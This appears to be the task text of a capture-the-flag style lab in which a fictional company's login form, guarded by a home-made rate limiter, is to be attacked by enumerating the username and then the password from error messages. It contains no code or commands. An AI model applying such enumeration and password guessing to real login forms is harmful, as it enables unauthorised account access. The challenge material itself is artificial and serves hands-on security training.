SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly**.**

Before we start, download the required files by pressing the **Download Task Files** button.

Answer the questions below

I have downloaded the capture.zip file.

 Completed

Look at the error messages from the application when attempting to log in. Enumerate to discover the username (firstname). Then enumerate once more to discover the password.
